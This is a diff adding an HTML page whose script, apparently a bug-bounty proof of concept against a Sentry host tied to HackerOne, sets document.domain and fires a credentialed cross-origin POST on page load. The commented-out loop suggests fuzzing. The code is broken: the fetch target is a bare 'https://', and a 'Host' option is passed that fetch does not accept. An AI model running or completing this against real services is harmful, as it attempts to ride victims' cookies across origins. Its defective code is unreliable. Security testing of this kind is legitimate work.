@@ -1,0 +1,18 @@
+<html>
+
+<body>
+  <script>
+    window.onload = () => {
+      let headers = {};
+      //for (let i = 0; i <= 0x10fff; i++) {
+        try {
+          document.domain = "hackerone1.sentry.io"
+          fetch("https://", { method: 'POST', credentials: "include", Host:"hackerone1.sentry.io"}).then(resp => console.log(resp.text()))
+        } catch (e) { console.log(e) }
+      }
+
+    //}
+  </script>
+</body>
+
+</html>
